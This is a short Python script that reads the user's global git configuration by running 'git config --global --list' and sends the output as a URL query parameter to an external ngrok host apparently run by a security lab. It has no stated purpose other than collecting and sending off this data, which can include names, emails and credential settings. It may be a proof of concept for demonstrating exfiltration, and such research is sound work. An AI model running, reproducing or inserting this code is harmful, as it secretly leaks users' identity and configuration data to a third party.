# Import necessary modules
import subprocess
import requests
import urllib.parse

# Function to get git config output
def get_git_config_output():
    """
    Executes the 'git config --global --list' command and returns its output.
    Prints an error message and returns None if the command fails.
    """
    try:
        # Execute the git command
        process = subprocess.Popen(['git', 'config', '--global', '--list'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()

        # Check if the command was successful
        if process.returncode == 0:
            return stdout
        else:
            print(f"Error getting git config: {stderr}")
            return None
    except FileNotFoundError:
        print("Error: git command not found. Please ensure git is installed and in your PATH.")
        return None
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return None

# Function to send data to a server
def send_data_to_server(data):
    """
    Sends the given data to a remote server via a GET request.
    The data is URL-encoded and appended as a query parameter.
    """
    # Define the target URL
    base_url = "https://nomasec-labs.ngrok.app/"

    try:
        # URL encode the data
        encoded_data = urllib.parse.quote_plus(data)

        # Construct the full URL
        full_url = f"{base_url}?data={encoded_data}"

        # Make the GET request
        response = requests.get(full_url)

        # Check the response status code
        if response.status_code == 200:
            print("Data sent successfully!")
        else:
            print(f"Error sending data. Status code: {response.status_code}")
            print(f"Response: {response.text}")

    except requests.exceptions.RequestException as e:
        print(f"Error sending data: {e}")
    except Exception as e:
        print(f"An unexpected error occurred during data sending: {e}")

# Main execution block
if __name__ == "__main__":
    # Get git configuration
    git_config_output = get_git_config_output()

    # If git config output is available, send it to the server
    if git_config_output:
        send_data_to_server(git_config_output)
    else:
        print("No git configuration to send.")
